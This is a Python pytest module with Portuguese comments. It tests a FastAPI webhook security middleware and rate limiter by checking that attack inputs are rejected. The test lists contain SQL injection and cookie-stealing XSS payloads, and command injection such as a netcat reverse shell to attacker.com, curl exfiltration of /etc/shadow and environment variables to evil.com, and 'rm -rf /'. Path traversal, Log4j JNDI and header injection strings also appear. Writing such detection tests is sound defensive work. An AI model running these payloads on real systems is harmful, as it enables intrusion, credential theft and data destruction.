"""
Testes de penetração para avaliação de vulnerabilidades de segurança.

Este módulo contém testes que simulam ataques reais para identificar
vulnerabilidades no sistema de webhooks e validar as proteções implementadas.
"""

import pytest
import asyncio
import json
import base64
import time
from typing import Dict, Any, List
from unittest.mock import Mock, patch, AsyncMock
from fastapi.testclient import TestClient
from fastapi import FastAPI

from app.api.middleware.advanced_security_middleware import (
    AdvancedSecurityMiddleware,
    CORSSecurityMiddleware,
    configure_advanced_security
)
from app.services.advanced_rate_limiting import (
    AdvancedRateLimiter,
    ThreatLevel,
    BlockReason
)


class TestSQLInjectionPenetration:
    """Testes de penetração para SQL Injection."""
    
    def setup_method(self):
        """Setup para cada teste."""
        self.app = FastAPI()
        
        @self.app.post("/webhook/test")
        async def test_webhook(data: Dict[str, Any]):
            return {"received": data}
        
        # Adicionar middleware de segurança
        self.app = AdvancedSecurityMiddleware(
            self.app,
            enable_attack_detection=True
        )
        
        self.client = TestClient(self.app)
    
    def test_sql_injection_in_url_parameters(self):
        """Testa injeção SQL em parâmetros de URL."""
        
        sql_payloads = [
            "'; DROP TABLE users; --",
            "1' OR '1'='1",
            "admin'--",
            "1' UNION SELECT * FROM users--",
            "'; INSERT INTO users VALUES ('hacker', 'password'); --",
            "1' AND (SELECT COUNT(*) FROM information_schema.tables) > 0--",
            "' OR 1=1#",
            "' OR 'a'='a",
            "1'; EXEC xp_cmdshell('dir'); --"
        ]
        
        for payload in sql_payloads:
            response = self.client.post(
                f"/webhook/test?id={payload}",
                json={"message": "test"}
            )
            
            # Deve ser bloqueado
            assert response.status_code == 400
            assert response.json()["code"] == "ATTACK_DETECTED"
            assert "sql" in str(response.json()).lower()
    
    def test_sql_injection_in_headers(self):
        """Testa injeção SQL em headers."""
        
        sql_headers = {
            "X-User-ID": "'; DROP TABLE users; --",
            "X-Session": "1' OR '1'='1",
            "X-Custom": "admin'--"
        }
        
        response = self.client.post(
            "/webhook/test",
            json={"message": "test"},
            headers=sql_headers
        )
        
        assert response.status_code == 400
        assert response.json()["code"] == "ATTACK_DETECTED"
    
    def test_sql_injection_in_json_payload(self):
        """Testa injeção SQL em payload JSON."""
        
        malicious_payloads = [
            {"username": "'; DROP TABLE users; --", "password": "test"},
            {"search": "1' OR '1'='1", "category": "all"},
            {"id": "1' UNION SELECT password FROM users--"},
            {"filter": {"name": "admin'--", "active": True}}
        ]
        
        for payload in malicious_payloads:
            response = self.client.post(
                "/webhook/test",
                json=payload
            )
            
            assert response.status_code == 400
            assert response.json()["code"] == "ATTACK_DETECTED"
    
    def test_blind_sql_injection(self):
        """Testa blind SQL injection."""
        
        blind_payloads = [
            "1' AND (SELECT SUBSTRING(@@version,1,1))='5'--",
            "1' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
            "1' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64--"
        ]
        
        for payload in blind_payloads:
            response = self.client.post(
                "/webhook/test",
                json={"query": payload}
            )
            
            assert response.status_code == 400
            assert response.json()["code"] == "ATTACK_DETECTED"


class TestXSSPenetration:
    """Testes de penetração para Cross-Site Scripting (XSS)."""
    
    def setup_method(self):
        """Setup para cada teste."""
        self.app = FastAPI()
        
        @self.app.post("/webhook/test")
        async def test_webhook(data: Dict[str, Any]):
            return {"received": data}
        
        self.app = AdvancedSecurityMiddleware(
            self.app,
            enable_attack_detection=True
        )
        
        self.client = TestClient(self.app)
    
    def test_reflected_xss_attacks(self):
        """Testa ataques XSS refletidos."""
        
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src='javascript:alert(\"XSS\")'></iframe>",
            "<object data='data:text/html,<script>alert(\"XSS\")</script>'></object>",
            "<embed src='data:text/html,<script>alert(\"XSS\")</script>'>",
            "<link rel='stylesheet' href='javascript:alert(\"XSS\")'>",
            "<meta http-equiv='refresh' content='0;url=javascript:alert(\"XSS\")'>"
        ]
        
        for payload in xss_payloads:
            response = self.client.post(
                "/webhook/test",
                json={"message": payload}
            )
            
            assert response.status_code == 400
            assert response.json()["code"] == "ATTACK_DETECTED"
    
    def test_stored_xss_simulation(self):
        """Simula ataques XSS armazenados."""
        
        stored_xss_payloads = [
            {"comment": "<script>document.location='http://evil.com/steal?cookie='+document.cookie</script>"},
            {"bio": "<img src=x onerror=fetch('http://evil.com/log?data='+btoa(document.cookie))>"},
            {"description": "<svg/onload=eval(atob('YWxlcnQoJ1hTUycpOw=='))>"}  # Base64 encoded alert
        ]
        
        for payload in stored_xss_payloads:
            response = self.client.post(
                "/webhook/test",
                json=payload
            )
            
            assert response.status_code == 400
            assert response.json()["code"] == "ATTACK_DETECTED"
    
    def test_dom_based_xss_vectors(self):
        """Testa vetores de XSS baseados em DOM."""
        
        dom_xss_payloads = [
            "javascript:alert(document.domain)",
            "data:text/html,<script>alert('XSS')</script>",
            "vbscript:msgbox('XSS')",
            "#<script>alert('XSS')</script>",
            "?search=<script>alert('XSS')</script>"
        ]
        
        for payload in dom_xss_payloads:
            response = self.client.post(
                f"/webhook/test?redirect={payload}",
                json={"message": "test"}
            )
            
            assert response.status_code == 400
            assert response.json()["code"] == "ATTACK_DETECTED"
    
    def test_xss_filter_bypass_attempts(self):
        """Testa tentativas de bypass de filtros XSS."""
        
        bypass_payloads = [
            "<ScRiPt>alert('XSS')</ScRiPt>",  # Case variation
            "<script>alert(String.fromCharCode(88,83,83))</script>",  # Character encoding
            "<script>eval('\\x61\\x6c\\x65\\x72\\x74\\x28\\x27\\x58\\x53\\x53\\x27\\x29')</script>",  # Hex encoding
            "<script>alert(/XSS/.source)</script>",  # Regex
            "<svg><script>alert('XSS')</script></svg>",  # Nested tags
            "<<script>alert('XSS')</script>",  # Malformed tags
            "<script src=data:,alert('XSS')></script>",  # Data URI
            "<script>setTimeout('alert(\"XSS\")',1)</script>"  # Delayed execution
        ]
        
        for payload in bypass_payloads:
            response = self.client.post(
                "/webhook/test",
                json={"content": payload}
            )
            
            assert response.status_code == 400
            assert response.json()["code"] == "ATTACK_DETECTED"


class TestCommandInjectionPenetration:
    """Testes de penetração para Command Injection."""
    
    def setup_method(self):
        """Setup para cada teste."""
        self.app = FastAPI()
        
        @self.app.post("/webhook/test")
        async def test_webhook(data: Dict[str, Any]):
            return {"received": data}
        
        self.app = AdvancedSecurityMiddleware(
            self.app,
            enable_attack_detection=True
        )
        
        self.client = TestClient(self.app)
    
    def test_command_injection_attacks(self):
        """Testa ataques de injeção de comando."""
        
        cmd_payloads = [
            "; cat /etc/passwd",
            "| whoami",
            "&& ls -la",
            "`id`",
            "$(uname -a)",
            "; wget http://evil.com/shell.sh",
            "| nc -e /bin/sh attacker.com 4444",
            "; rm -rf /",
            "&& curl http://evil.com/exfiltrate -d @/etc/shadow",
            "$(curl -X POST http://evil.com/callback -d \"$(env)\")"
        ]
        
        for payload in cmd_payloads:
            response = self.client.post(
                "/webhook/test",
                json={"command": payload}
            )
            
            assert response.status_code == 400
            assert response.json()["code"] == "ATTACK_DETECTED"
    
    def test_path_traversal_attacks(self):
        """Testa ataques de path traversal."""
        
        traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "/proc/self/environ",
            "/proc/version",
            "/etc/shadow",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",  # URL encoded
            "..%252f..%252f..%252fetc%252fpasswd",  # Double URL encoded
            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"  # Unicode bypass
        ]
        
        for payload in traversal_payloads:
            response = self.client.post(
                "/webhook/test",
                json={"file": payload}
            )
            
            assert response.status_code == 400
            assert response.json()["code"] == "ATTACK_DETECTED"


class TestRateLimitingPenetration:
    """Testes de penetração para rate limiting."""
    
    def setup_method(self):
        """Setup para cada teste."""
        self.mock_redis = Mock()
        self.rate_limiter = AdvancedRateLimiter(self.mock_redis)
    
    @pytest.mark.asyncio
    async def test_rapid_fire_attack_detection(self):
        """Testa detecção de ataques rapid fire."""
        
        # Simular muitas requisições em pouco tempo
        current_time = int(time.time())
        
        # Mock Redis responses para simular rapid fire
        self.mock_redis.zadd = AsyncMock()
        self.mock_redis.zremrangebyscore = AsyncMock()
        self.mock_redis.expire = AsyncMock()
        self.mock_redis.zcard = AsyncMock(return_value=50)  # 50 requests in 5 seconds
        
        result = await self.rate_limiter.check_rate_limit(
            integration_id="test-integration",
            ip_address="192.168.1.100",
            user_agent="AttackBot/1.0",
            payload_size=1024
        )
        
        # Deve detectar como ameaça
        assert not result.allowed
        assert result.threat_level in [ThreatLevel.MEDIUM, ThreatLevel.HIGH, ThreatLevel.CRITICAL]
    
    @pytest.mark.asyncio
    async def test_distributed_attack_detection(self):
        """Testa detecção de ataques distribuídos."""
        
        # Simular mesmo token sendo usado por múltiplos IPs
        self.mock_redis.sadd = AsyncMock()
        self.mock_redis.expire = AsyncMock()
        self.mock_redis.scard = AsyncMock(return_value=10)  # 10 unique IPs
        self.mock_redis.incr = AsyncMock(return_value=100)  # 100 total requests
        self.mock_redis.get = AsyncMock(return_value=b'100')
        
        result = await self.rate_limiter.check_rate_limit(
            integration_id="test-integration",
            ip_address="192.168.1.100",
            token="whk_test_token_123"
        )
        
        # Deve detectar ataque distribuído
        assert not result.allowed
        assert result.threat_level in [ThreatLevel.HIGH, ThreatLevel.CRITICAL]
    
    @pytest.mark.asyncio
    async def test_payload_bombing_detection(self):
        """Testa detecção de payload bombing."""
        
        # Simular payloads muito grandes frequentes
        large_payload_size = 10 * 1024 * 1024  # 10MB
        
        self.mock_redis.incr = AsyncMock(return_value=5)  # 5 large payloads
        self.mock_redis.expire = AsyncMock()
        
        result = await self.rate_limiter.check_rate_limit(
            integration_id="test-integration",
            ip_address="192.168.1.100",
            payload_size=large_payload_size
        )
        
        # Deve detectar payload bombing
        assert not result.allowed
        assert result.threat_level == ThreatLevel.CRITICAL
    
    @pytest.mark.asyncio
    async def test_progressive_rate_limiting(self):
        """Testa rate limiting progressivo."""
        
        # Simular escalação de ameaças
        self.mock_redis.get = AsyncMock(return_value=b'3')  # Escalation level 3
        self.mock_redis.incr = AsyncMock()
        self.mock_redis.expire = AsyncMock()
        
        # Mock para análise de ameaças
        with patch.object(self.rate_limiter, '_analyze_threat_patterns') as mock_analyze:
            mock_analyze.return_value = Mock(
                threat_level=ThreatLevel.HIGH,
                patterns=["rapid_fire", "suspicious_user_agent"],
                details={"detected_patterns": ["rapid_fire"]}
            )
            
            result = await self.rate_limiter.check_rate_limit(
                integration_id="test-integration",
                ip_address="192.168.1.100",
                user_agent="sqlmap/1.0"
            )
        
        # Deve aplicar limitação progressiva
        assert not result.allowed
        assert result.delay_seconds > 0
        assert result.threat_level == ThreatLevel.HIGH


class TestAuthenticationBypassPenetration:
    """Testes de penetração para bypass de autenticação."""
    
    def setup_method(self):
        """Setup para cada teste."""
        self.app = FastAPI()
        
        @self.app.post("/webhook/{agent_id}")
        async def webhook_handler(agent_id: str, authorization: str = None):
            if not authorization or not authorization.startswith("Bearer "):
                return {"error": "Unauthorized"}
            return {"success": True, "agent_id": agent_id}
        
        self.client = TestClient(self.app)
    
    def test_token_manipulation_attacks(self):
        """Testa ataques de manipulação de token."""
        
        # Tokens maliciosos
        malicious_tokens = [
            "Bearer ../../../etc/passwd",
            "Bearer <script>alert('XSS')</script>",
            "Bearer '; DROP TABLE tokens; --",
            "Bearer ${jndi:ldap://evil.com/exploit}",  # Log4j style
            "Bearer {{7*7}}",  # Template injection
            "Bearer %{(#context['xwork.MethodAccessor.denyMethodExecution']=false)}",  # OGNL
            "Bearer ../../../../../../etc/passwd%00.jpg",  # Null byte injection
            "Bearer whk_" + "A" * 10000,  # Oversized token
        ]
        
        for token in malicious_tokens:
            response = self.client.post(
                "/webhook/test-agent",
                headers={"Authorization": token},
                json={"message": "test"}
            )
            
            # Deve rejeitar tokens maliciosos
            assert response.status_code in [400, 401, 403]
    
    def test_header_injection_attacks(self):
        """Testa ataques de injeção em headers."""
        
        malicious_headers = {
            "Authorization": "Bearer whk_valid_token\r\nX-Injected: malicious",
            "X-Forwarded-For": "127.0.0.1\r\nX-Injected: header",
            "User-Agent": "Mozilla/5.0\r\n\r\n<script>alert('XSS')</script>",
            "Content-Type": "application/json\r\nX-Evil: injected"
        }
        
        for header_name, header_value in malicious_headers.items():
            response = self.client.post(
                "/webhook/test-agent",
                headers={header_name: header_value},
                json={"message": "test"}
            )
            
            # Deve detectar injeção de header
            assert response.status_code in [400, 401]
    
    def test_authentication_timing_attacks(self):
        """Testa ataques de timing em autenticação."""
        
        # Medir tempo de resposta para tokens válidos vs inválidos
        valid_token = "Bearer whk_valid_token_123456789"
        invalid_tokens = [
            "Bearer whk_invalid_token_123456789",
            "Bearer whk_another_invalid_token",
            "Bearer whk_completely_wrong_token"
        ]
        
        # Tempo para token válido (simulado)
        start_time = time.time()
        response_valid = self.client.post(
            "/webhook/test-agent",
            headers={"Authorization": valid_token},
            json={"message": "test"}
        )
        valid_time = time.time() - start_time
        
        # Tempos para tokens inválidos
        invalid_times = []
        for token in invalid_tokens:
            start_time = time.time()
            response = self.client.post(
                "/webhook/test-agent",
                headers={"Authorization": token},
                json={"message": "test"}
            )
            invalid_time = time.time() - start_time
            invalid_times.append(invalid_time)
        
        # Verificar que não há diferença significativa de timing
        # (proteção contra timing attacks)
        avg_invalid_time = sum(invalid_times) / len(invalid_times)
        time_difference = abs(valid_time - avg_invalid_time)
        
        # Diferença deve ser mínima (menos de 100ms)
        assert time_difference < 0.1


class TestCORSSecurityPenetration:
    """Testes de penetração para segurança CORS."""
    
    def setup_method(self):
        """Setup para cada teste."""
        self.app = FastAPI()
        
        @self.app.get("/api/data")
        async def get_data():
            return {"sensitive": "data"}
        
        # Configurar CORS com origens específicas
        allowed_origins = ["https://trusted-domain.com", "https://app.example.com"]
        self.app = CORSSecurityMiddleware(
            self.app,
            allow_origins=allowed_origins,
            allow_credentials=True
        )
        
        self.client = TestClient(self.app)
    
    def test_cors_origin_bypass_attempts(self):
        """Testa tentativas de bypass de CORS."""
        
        malicious_origins = [
            "https://trusted-domain.com.evil.com",  # Subdomain bypass
            "https://evil.com/trusted-domain.com",  # Path bypass
            "https://trusted-domain.com@evil.com",  # User info bypass
            "https://trusted-domain.com.evil.com",  # Homograph attack
            "null",  # Null origin
            "file://",  # File protocol
            "data:text/html,<script>alert('XSS')</script>",  # Data URI
            "javascript:alert('XSS')",  # JavaScript protocol
            "https://trusted-domain.com:8080@evil.com"  # Port bypass
        ]
        
        for origin in malicious_origins:
            response = self.client.options(
                "/api/data",
                headers={"Origin": origin}
            )
            
            # Não deve permitir origens maliciosas
            cors_header = response.headers.get("Access-Control-Allow-Origin")
            assert cors_header != origin
    
    def test_cors_credential_theft_attempts(self):
        """Testa tentativas de roubo de credenciais via CORS."""
        
        # Tentar acessar com origem maliciosa e credenciais
        response = self.client.get(
            "/api/data",
            headers={
                "Origin": "https://evil.com",
                "Cookie": "session=sensitive_session_token"
            }
        )
        
        # Não deve incluir Access-Control-Allow-Credentials para origem não confiável
        assert "Access-Control-Allow-Credentials" not in response.headers
    
    def test_cors_preflight_manipulation(self):
        """Testa manipulação de requisições preflight."""
        
        # Requisição preflight maliciosa
        response = self.client.options(
            "/api/data",
            headers={
                "Origin": "https://evil.com",
                "Access-Control-Request-Method": "POST",
                "Access-Control-Request-Headers": "X-Evil-Header, Authorization"
            }
        )
        
        # Não deve permitir headers maliciosos
        allowed_headers = response.headers.get("Access-Control-Allow-Headers", "")
        assert "X-Evil-Header" not in allowed_headers


class TestInputValidationBypassPenetration:
    """Testes de penetração para bypass de validação de entrada."""
    
    def setup_method(self):
        """Setup para cada teste."""
        self.app = FastAPI()
        
        @self.app.post("/webhook/test")
        async def test_webhook(data: Dict[str, Any]):
            return {"received": data}
        
        self.app = AdvancedSecurityMiddleware(
            self.app,
            enable_attack_detection=True
        )
        
        self.client = TestClient(self.app)
    
    def test_encoding_bypass_attempts(self):
        """Testa tentativas de bypass via encoding."""
        
        # Payloads com diferentes encodings
        encoded_payloads = [
            # URL encoding
            "%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E",
            # Double URL encoding
            "%253Cscript%253Ealert%2528%2527XSS%2527%2529%253C%252Fscript%253E",
            # HTML entity encoding
            "&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;",
            # Unicode encoding
            "\\u003cscript\\u003ealert(\\u0027XSS\\u0027)\\u003c/script\\u003e",
            # Base64 encoding
            base64.b64encode(b"<script>alert('XSS')</script>").decode(),
            # Hex encoding
            "\\x3cscript\\x3ealert\\x28\\x27XSS\\x27\\x29\\x3c\\x2fscript\\x3e"
        ]
        
        for payload in encoded_payloads:
            response = self.client.post(
                "/webhook/test",
                json={"content": payload}
            )
            
            # Deve detectar mesmo com encoding
            assert response.status_code == 400
            assert response.json()["code"] == "ATTACK_DETECTED"
    
    def test_content_type_manipulation(self):
        """Testa manipulação de Content-Type."""
        
        malicious_payload = {"script": "<script>alert('XSS')</script>"}
        
        # Diferentes Content-Types maliciosos
        content_types = [
            "application/json; charset=utf-7",  # UTF-7 bypass
            "text/plain",  # Wrong content type
            "application/x-www-form-urlencoded",  # Form data
            "multipart/form-data",  # Multipart
            "text/xml",  # XML
            "application/xml"  # XML application
        ]
        
        for content_type in content_types:
            response = self.client.post(
                "/webhook/test",
                json=malicious_payload,
                headers={"Content-Type": content_type}
            )
            
            # Deve validar Content-Type apropriadamente
            if content_type not in ["application/json", "text/plain"]:
                assert response.status_code == 415  # Unsupported Media Type
    
    def test_size_limit_bypass_attempts(self):
        """Testa tentativas de bypass de limite de tamanho."""
        
        # Payload muito grande
        large_payload = {"data": "A" * (20 * 1024 * 1024)}  # 20MB
        
        response = self.client.post(
            "/webhook/test",
            json=large_payload
        )
        
        # Deve rejeitar payload muito grande
        assert response.status_code == 413  # Request Entity Too Large
    
    def test_nested_object_bomb(self):
        """Testa ataques de bomb com objetos aninhados."""
        
        # Criar objeto profundamente aninhado
        nested_bomb = {}
        current = nested_bomb
        
        for i in range(50):  # 50 níveis de profundidade
            current["level"] = {}
            current = current["level"]
        
        current["payload"] = "<script>alert('XSS')</script>"
        
        response = self.client.post(
            "/webhook/test",
            json=nested_bomb
        )
        
        # Deve detectar profundidade excessiva ou ataque
        assert response.status_code in [400, 413]


class TestSecurityHeadersPenetration:
    """Testes de penetração para headers de segurança."""
    
    def setup_method(self):
        """Setup para cada teste."""
        self.app = FastAPI()
        
        @self.app.get("/api/test")
        async def test_endpoint():
            return {"message": "test"}
        
        self.app = AdvancedSecurityMiddleware(
            self.app,
            enable_csp=True,
            enable_hsts=True
        )
        
        self.client = TestClient(self.app)
    
    def test_security_headers_presence(self):
        """Testa presença de headers de segurança."""
        
        response = self.client.get("/api/test")
        
        # Headers obrigatórios de segurança
        required_headers = [
            "X-Content-Type-Options",
            "X-Frame-Options",
            "X-XSS-Protection",
            "Content-Security-Policy",
            "Referrer-Policy"
        ]
        
        for header in required_headers:
            assert header in response.headers, f"Header {header} ausente"
        
        # Verificar valores corretos
        assert response.headers["X-Content-Type-Options"] == "nosniff"
        assert response.headers["X-Frame-Options"] == "DENY"
        assert response.headers["X-XSS-Protection"] == "1; mode=block"
    
    def test_csp_bypass_attempts(self):
        """Testa tentativas de bypass de CSP."""
        
        response = self.client.get("/api/test")
        csp = response.headers.get("Content-Security-Policy", "")
        
        # CSP deve ser restritiva
        assert "unsafe-eval" not in csp
        assert "unsafe-inline" not in csp or "'unsafe-inline'" in csp  # Quoted is safer
        assert "*" not in csp or "data:" not in csp  # Wildcard restrictions
    
    def test_clickjacking_protection(self):
        """Testa proteção contra clickjacking."""
        
        response = self.client.get("/api/test")
        
        # Deve ter proteção contra clickjacking
        x_frame_options = response.headers.get("X-Frame-Options")
        csp = response.headers.get("Content-Security-Policy", "")
        
        assert (x_frame_options == "DENY" or 
                x_frame_options == "SAMEORIGIN" or
                "frame-ancestors 'none'" in csp)


class TestHoneypotPenetration:
    """Testes de penetração para honeypots."""
    
    def setup_method(self):
        """Setup para cada teste."""
        self.app = FastAPI()
        
        @self.app.get("/api/test")
        async def test_endpoint():
            return {"message": "test"}
        
        self.app = AdvancedSecurityMiddleware(
            self.app,
            enable_honeypot=True
        )
        
        self.client = TestClient(self.app)
    
    def test_honeypot_detection(self):
        """Testa detecção via honeypots."""
        
        # Paths de honeypot comuns
        honeypot_paths = [
            "/admin",
            "/wp-admin", 
            "/phpmyadmin",
            "/administrator",
            "/.env",
            "/config.php",
            "/database.sql",
            "/backup.zip"
        ]
        
        for path in honeypot_paths:
            response = self.client.get(path)
            
            # Honeypot deve responder de forma enganosa
            assert response.status_code == 200
            assert "success" in response.json()
            
            # Mas deve logar o acesso suspeito
            # (verificação seria feita nos logs em produção)
    
    def test_bot_detection_via_honeypot(self):
        """Testa detecção de bots via honeypot."""
        
        # Simular comportamento de bot
        bot_user_agents = [
            "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
            "facebookexternalhit/1.1",
            "Twitterbot/1.0",
            "LinkedInBot/1.0",
            "sqlmap/1.0",
            "Nikto/2.1.6"
        ]
        
        for user_agent in bot_user_agents:
            response = self.client.get(
                "/robots.txt",  # Honeypot comum
                headers={"User-Agent": user_agent}
            )
            
            # Deve responder mas logar como suspeito
            assert response.status_code == 200